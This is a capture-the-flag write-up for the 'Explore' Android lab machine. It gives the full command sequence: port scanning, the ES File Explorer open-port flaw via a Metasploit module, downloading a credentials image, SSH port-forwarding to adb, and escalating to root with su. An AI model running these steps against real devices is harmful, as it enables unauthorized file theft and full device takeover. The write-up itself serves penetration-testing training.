![[explore1.png]]

----

## User.txt
Let’s check the **open ports** with **nmap**

```bash
sudo nmap -sV -p- -Pn -vv -T4 10.10.10.247
```

Output:
```bash
PORT      STATE    SERVICE REASON         VERSION
2222/tcp  open     ssh     syn-ack ttl 63 Banana Studio SSH server app (net.xnano.android.sshserver.tv) (protocol 2.0)
5555/tcp  filtered freeciv no-response
46243/tcp open     unknown syn-ack ttl 63
59777/tcp open     http    syn-ack ttl 63 Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
```

Looking in the **port 59777** i found this directories
```bash
/bin                  (Status: 301) [Size: 63] [--> /bin/]
/cache                (Status: 301) [Size: 67] [--> /cache/]
/config               (Status: 301) [Size: 69] [--> /config/]
/d                    (Status: 301) [Size: 59] [--> /d/]
/data                 (Status: 301) [Size: 65] [--> /data/]
/dev                  (Status: 301) [Size: 63] [--> /dev/]
/etc                  (Status: 301) [Size: 63] [--> /etc/]
/init                 (Status: 403) [Size: 31]
/lib                  (Status: 301) [Size: 63] [--> /lib/]
/oem                  (Status: 301) [Size: 63] [--> /oem/]
/proc                 (Status: 301) [Size: 65] [--> /proc/]
/product              (Status: 301) [Size: 71] [--> /product/]
/sbin                 (Status: 301) [Size: 65] [--> /sbin/]
/storage              (Status: 301) [Size: 71] [--> /storage/]
/sys                  (Status: 301) [Size: 63] [--> /sys/]
/system               (Status: 301) [Size: 69] [--> /system/]
/vendor               (Status: 301) [Size: 69] [--> /vendor/]
```

It’s seems as a **file explorer**. If we search **port 59777** on Google, we can found
![[explore2.png]]

Try searching in **metasploit**
There are a **aux** module
```bash
use auxiliary/scanner/http/es_file_explorer_open_port
```

And then, **show options**
```bash
Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   ACTIONITEM                   no        If an app or filename if required by the action
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      10.10.10.247     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usin
                                          g-metasploit.html
   RPORT       59777            yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   THREADS     1                yes       The number of concurrent threads (max one per host)
   VHOST                        no        HTTP server virtual host


Auxiliary action:

   Name           Description
   ----           -----------
   GETDEVICEINFO  Get device info
```

Set the **RHOSTS** and type **show actions**
```bash
Auxiliary actions:

    Name            Description
    ----            -----------
    APPLAUNCH       Launch an app. ACTIONITEM required.
=>  GETDEVICEINFO   Get device info
    GETFILE         Get a file from the device. ACTIONITEM required.
    LISTAPPS        List all the apps installed
    LISTAPPSALL     List all the apps installed
    LISTAPPSPHONE   List all the phone apps installed
    LISTAPPSSDCARD  List all the apk files stored on the sdcard
    LISTAPPSSYSTEM  List all the system apps installed
    LISTAUDIOS      List all the audio files
    LISTFILES       List all the files on the sdcard
    LISTPICS        List all the pictures
    LISTVIDEOS      List all the videos
```

Trying every action, I can look some interesting.
Set the action LISTPICS with **set action LISTPICS**
And then, exploit

Output
```bash
[+] 10.10.10.247:59777
concept.jpg (135.33 KB) - 4/21/21 02:38:08 AM: /storage/emulated/0/DCIM/concept.jpg
anc.png (6.24 KB) - 4/21/21 02:37:50 AM: /storage/emulated/0/DCIM/anc.png
creds.jpg (1.14 MB) - 4/21/21 02:38:18 AM: /storage/emulated/0/DCIM/creds.jpg
224_anc.png (124.88 KB) - 4/21/21 02:37:21 AM: /storage/emulated/0/DCIM/224_anc.png
```

We can see the **creds.jpg** file
```bash
wget http://10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg
```

![[explore3.png]]

**User:** kristi
**Password:** Kr1sT!5h@Rp3xPl0r3!

Let’s log in via **ssh**
```bash
ssh kristi@10.10.10.247 -p 2222
```

After search in the **file system**, I found the **user.txt** flag in
```bash
/sdcard/user.txt
```

```bash
:/sdcard $ cat user.txt
f3201717***********91ae250
:/sdcard $
```

## Root.txt
Now let’s **identify the port 5555**, that normally is for **adb** connections.
```bash
ss -ntpl
```

```bash
State       Recv-Q Send-Q Local Address:Port               Peer Address:Port
LISTEN      0      50           *:2222                     *:*                   users:(("ss",pid=28719,fd=84),("sh",pid=27000,fd=84),("droid.sshserver",pid=3946,fd=84))
LISTEN      0      8       [::ffff:127.0.0.1]:36431                    *:*
LISTEN      0      50       [::ffff:10.10.10.247]:38223                    *:*
LISTEN      0      4            *:5555                     *:*
LISTEN      0      10           *:42135                    *:*
LISTEN      0      50           *:59777                    *:*
```

From our host the **5555 port is filtered**, then, we can do a port forward through **ssh**
```bash
ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222
```

Now we can connect with **adb**
```bash
adb connect 127.0.0.1:5555
```

And get a **shell**
```bash
adb shell
```

```bash
x86_64:/ $ whoami
shell
```

Then, type **su** and press enter
```bash
x86_64:/ $ su
:/ # whoami
root
```

Now we are **root** and just find the **root.txt** flag in
```bash
:/ # cd data
:/data # cat root.txt
f04fc*********2be59338c5
:/data #
```


I hope you found it useful (: